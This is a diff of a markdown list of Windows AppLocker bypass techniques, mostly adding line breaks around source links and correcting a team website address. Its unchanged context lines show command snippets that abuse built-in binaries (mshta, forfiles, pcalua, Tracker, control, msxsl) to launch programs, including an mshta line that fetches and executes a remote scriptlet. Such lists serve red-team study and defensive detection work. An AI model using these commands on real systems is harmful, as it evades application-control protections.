@@ -29,7 +29,7 @@ Hi there, I'm Demon. I have an interest in technology, both development of appli
 
 About my team
 
-secist(http://www.secis.com) is a volunteer group focused on promoting writers and their writing in a professional way, across different social media platforms for free.We provide a platform for those with a story to tell, knowledge to share, or an experience that we can all learn from. 
+secist(http://www.secist.com) is a volunteer group focused on promoting writers and their writing in a professional way, across different social media platforms for free.We provide a platform for those with a story to tell, knowledge to share, or an experience that we can all learn from. 
 
 If you are a new or emerging writer, work with us to raise your profile, polish your articles and present your work in the best possible light.
 
@@ -207,7 +207,8 @@ https://github.com/re4lity/subTee-gits-backups
 ``` stylus
 "powershell.exe Get-AuthenticodeSignature C:\\Windows\\diagnostics\\system\\AERO\\CL_Invocation.ps1;. C:\\Windows\\diagnostics\\system\\AERO\\CL_Invocation.ps1;SyncInvoke  calc.exe
 ```
-Link: https://twitter.com/bohops/status/948061991012327424
+Link:
+https://twitter.com/bohops/status/948061991012327424
 
 
 
@@ -221,6 +222,7 @@ Link: https://twitter.com/bohops/status/948061991012327424
 forfiles /p c:\\windows\\system32 /m notepad.exe /c calc.exe
 ```
 Link：
+
 https://twitter.com/Evi1cg/status/935027922397573120
 
 
@@ -234,7 +236,9 @@ https://twitter.com/Evi1cg/status/935027922397573120
 mshta.exe javascript:a=GetObject(\"script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/atomic-dev-cs/Windows/Payloads/mshta.sct\").Exec();close();"
 ```
 
-Link: https://twitter.com/subTee/status/953990877264994304
+Link: 
+
+https://twitter.com/subTee/status/953990877264994304
 
 
 
@@ -247,7 +251,9 @@ Link: https://twitter.com/subTee/status/953990877264994304
 ``` stylus
 c:\Windows\System32\pcalua.exe -a calc.exe
 ```
-Link:  https://twitter.com/KyleHanslovan/status/912659279806640128
+Link:  
+
+https://twitter.com/KyleHanslovan/status/912659279806640128
 
 
 
@@ -264,7 +270,9 @@ Link:  https://twitter.com/KyleHanslovan/status/912659279806640128
 using System;System.Diagnostics.Process.Start("calc.exe");
 ```
 
-Link:  https://github.com/milkdevil/UltimateAppLockerByPassList
+Link: 
+
+https://github.com/milkdevil/UltimateAppLockerByPassList
 
 
 
@@ -316,6 +324,8 @@ var r = new ActiveXObject("WScript.Shell").Run("cmd.exe /k C:\\PSShell.exe");
 Link:  
 
 https://pentestlab.blog/2017/07/06/applocker-bypass-msxsl/
+
+
 https://evi1cg.me/archives/AppLocker_Bypass_MSXSL.html
 
 
@@ -328,7 +338,10 @@ Tracker.exe /d runcalc.dll /c cmd
 ```
 
 
-link https://twitter.com/Sudhanshu_C/status/943011972261412864
+link 
+
+https://twitter.com/Sudhanshu_C/status/943011972261412864
+
 https://twitter.com/subTee/status/793151392185589760
 
 
@@ -350,7 +363,12 @@ control  .\example\runcalc.dll
       control   .\example\demon:secist.dll
 ``` 
 LINK: https://twitter.com/bohops/status/954466315913310209
+
 https://oddvar.moe/2018/01/14/putting-data-in-alternate-data-streams-and-how-to-execute-it/
 
 
+## Ultimate AppLocker ByPass List
+
+LINK:
+https://github.com/milkdevil/UltimateAppLockerByPassList
 
